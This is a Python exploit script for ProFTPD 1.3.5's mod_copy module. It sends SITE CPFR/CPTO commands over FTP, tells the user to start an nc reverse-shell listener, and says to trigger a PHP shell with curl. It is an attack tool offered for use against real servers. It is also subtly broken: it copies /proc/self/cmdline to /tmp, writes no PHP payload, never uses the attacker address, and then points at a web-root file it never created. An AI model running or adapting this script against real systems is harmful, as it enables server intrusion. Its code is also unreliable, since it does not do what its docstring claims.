import socket
import sys


def exploit(target, attacker_ip, attacker_port):
    """
    ProFTPD 1.3.5 mod_copy RCE exploit
    Uses SITE CPFR/CPTO to copy a PHP reverse shell into the web root.

    Usage:
        1. Start listener: nc -lvnp <port>
        2. Run this script: python3 exploit.py <target_ip> <your_ip> <port>
    """

    print("[*] Connecting to " + target + ":21")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((target, 21))
        banner = s.recv(1024).decode().strip()
        print("[*] Banner: " + banner)

        if "ProFTPD 1.3.5" not in banner:
            print("[-] Target is not ProFTPD 1.3.5, exploit may not work")

        # test if mod_copy is active with SITE CPFR
        s.send(b"SITE CPFR /proc/self/cmdline\r\n")
        resp = s.recv(1024).decode().strip()
        print("[*] CPFR response: " + resp)

        if "350" not in resp:
            print("[-] mod_copy is not active or CPFR failed")
            s.close()
            return

        # copy to /tmp first
        s.send(b"SITE CPTO /tmp/shell.php\r\n")
        resp = s.recv(1024).decode().strip()
        print("[*] CPTO response: " + resp)

        s.close()

        print("[+] mod_copy commands sent successfully")
        print("[!] Make sure your listener is running: nc -lvnp " + str(attacker_port))
        print("[*] Trigger the payload: curl http://" + target + "/shell.php")

    except socket.timeout:
        print("[-] Connection timed out")
    except ConnectionRefusedError:
        print("[-] Connection refused, FTP service may not be running")
    except Exception as e:
        print("[-] Error: " + str(e))


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 exploit.py <target_ip> <your_ip> <port>")
        print("Example: python3 exploit.py 10.10.10.15 10.10.14.5 4444")
        sys.exit(1)

    target = sys.argv[1]
    attacker = sys.argv[2]
    port = int(sys.argv[3])

    exploit(target, attacker, port)
